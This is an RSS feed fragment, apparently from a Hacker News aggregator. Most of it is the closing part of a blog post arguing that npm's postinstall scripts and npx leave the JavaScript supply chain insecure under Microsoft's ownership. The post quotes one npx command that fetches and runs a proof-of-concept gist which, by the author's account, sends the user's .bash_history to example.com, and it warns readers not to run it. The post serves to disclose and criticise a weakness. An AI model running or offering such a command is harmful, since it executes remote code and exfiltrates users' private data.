.</p><blockquote><p>It wasn’t until 2015 they finally abandoned the existing Internet Explorer codebase and shifted to a new engine before eventually settling on their <del>Chome</del>Blink-based engine. However the ghost of IE <a href="https://www.forbes.com/sites/zakdoffman/2024/07/11/microsoft-warning-21-days-to-update-or-stop-using-windows/" target="_blank">still haunts us today</a>
.</p></blockquote><h3 id="the-ticking-time-bomb-of-postinstall">The ticking time-bomb of postinstall</h3><p>8 years ago, I wrote a small <a href="https://github.com/tanepiper/steal-ur-stuff" target="_blank">proof of concept</a>
. It was in response to <a href="https://github.com/npm/npm/issues/17724" target="_blank">this issue</a>
about <code>npx</code> – a small tool that had just been added to <code>npm</code> by default whether you liked it or not.</p><p>With <code>npx</code> you could now run the following arbitary command (PLEASE DO NOT RUN THIS SCRIPT):</p><pre tabindex="0"><code>npx https://gist.github.com/tanepiper/6cb9067adca626cd2c0edbc3786dad7b
</code></pre><p>This would now pull the gist as a node module and run it. In the proof-of-concept I put this command as a <code>postinstall</code> script. If you look at the gist, it’s a small binary script that posts your <code>.bash_history</code> to example.com – which at the time <code>npx</code> would just run.</p><p>My frustration at the time was aimed mostly towards <code>npx</code> itself – it seemed like the NPM team were adding a new easy-to-use attack vector by shipping a tool that could run <em>any module from any source on the web, on your machine without user interaction</em>. But little did I know at the time there was a deeper problem lurking with <code>postinstall</code>.</p><blockquote><p>At the time I also created a <a href="https://github.com/tanepiper/npm-lint" target="_blank">package.json linter</a>
that would warn of potential issues. But of course it required projects to opt in, it needed trust, and I didn’t see a way forward for it.</p></blockquote><p>This was, of course, <em>before</em> Microsoft, via GitHub, owned NPM.</p><h3 id="a-short-bit-of-history">A short bit of history</h3><p>So how did NPM become the main package manager for Node? Back then, it solved a problem – it was as simple as that – and people noticed it and adopted it. Over time, more useful little libraries showed up and from that, the rest is history.</p><p>NPM, built on CouchDB which enabled fast replication, allowed a flourishing and open JavaScript ecosystem. In the beginning, it was a bit of a wild west, where people tended to cut corners or miss steps. There was also a lot of early abandonment of libraries, and communities started to form around some of the larger ones to at least establish them as de facto tools – Express.js for example has been around since before <code>npm</code> (and for all the complaints about performance aimed at it: it’s highly battle tested and the worst bugs have likely been squashed).</p><p>Node and npm’s future was not a guaranteed thing. At some point, there was fragmentation of the ecosystem – tools such as <code>yarn</code> and <code>pnpm</code> exist because <code>npm</code> couldn’t or wouldn’t fix something, but they introduced their own changes that only made them partially compatible with each other. In 2014, for a short while we even had a fork of NodeJS called <code>io-js</code> because of fundamental disagreements.</p><p>There was also the small problem that all of this infrastructure and services cost money to run.</p><blockquote><p>To paraphrase <a href="https://blog.ceejbot.com/" target="_blank"><em>C J Silverio</em></a>
– “There’s no money in package managers.”</p></blockquote><p>In 2018 Microsoft bought GitHub (and until this year ran it as a side-concern with its own CEO and management team – just last month, the CEO stepped down and now GitHub is part of the “AI” team). In 2020, GitHub bought NPM – with pockets deep enough to run the infrastructure. This means that Microsoft owns the world’s largest repository of JavaScript code, the distribution channel for its packages – and the development ecosystem with VSCode.</p><p>This likely saved <code>npm</code> in the long run by them simply having the resources to do so.</p><p>On the other hand, they have done little to make it a more secure tool, especially for enterprise customers. To their credit, GitHub has provided <a href="https://www.infoq.com/news/2024/05/github-dependabot-supply-chain/" target="_blank">new tools for Software Bill of Materials Attestastion</a>
, which is a step in the right direction. But right now there are still no signed dependencies and nothing stopping people using AI agents, or just plain old scripts, from creating thousands of junk or namesquatting repositories.</p><p>… and as we’ve learned 2-Factor Authentication isn’t enough secure npm.</p><hr><h3 id="i-want-to-get-back-to-the-fun-of-building-software">I want to get back to the fun of building software</h3><p>Ultimately, I don’t think we can trust the software ecosystem provided by Microsoft anymore. It’s too fragile, brittle in the wrong places, and too open to abuse, and for most of my career I have seen the causes and effects first hand. This has made software development less fun, and more of a chore.</p><p>The tools we use to build software are not secure by default, and almost all of the time, the companies that provide them are not held to account for the security of their products.</p><p>Without a concerted effort across the industry to make the software supply chain secure by default, we will continue to see a rise in incidents – and the risks to data privacy and security will only increase. Criminal and state actors are always looking to exploit the vulnerabilities in our software; the use of AI to create more sophisticated attacks will only improve. These don’t have to be technical either – deep fakes are close enough to be used as effective social engineering tools - and it’s very easy to fake emails that seem very legitimte.</p><p>Unfortunately, Microsoft seem to be actively hostile - in their lack of attempts to shut down an active security hole that’s almost a decade old, they have left their customers are the higest levels of risk seen in computing.</p><blockquote><p>For many companies, now is the right time to start looking at the tools they use to build software, and to start asking the hard questions about the security of their software supply chain – is it putting their customers, workers, or own profits at risk?</p></blockquote></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Alibaba's New AI Chip Unveiled: Key Specifications Comparable to H20 (231 pts)]]></title>
            <link>https://news.futunn.com/en/post/62202518/alibaba-s-new-ai-chip-unveiled-key-specifications-comparable-to</link>
            <guid>45273747</guid>
            <pubDate>Wed, 17 Sep 2025 09:45:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://news.futunn.com/en/post/62202518/alibaba-s-new-ai-chip-unveiled-key-specifications-comparable-to">https://news.futunn.com/en/post/62202518/alibaba-s-new-ai-chip-unveiled-key-specifications-comparable-to</a>, See on <a href="https://news.ycombinator.com/item?id=45273747">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-v-50ed2316=""><div data-v-50ed2316=""><p>Operations too frequent. <br data-v-50ed2316="">Try again later</p></div> <p>Page not found, please try again later.</p> <p><a href="https://www.futunn.com/" data-v-50ed2316="">Take me home</a></p></div></div>]]></description>
        </item>
    </channel>
</rss>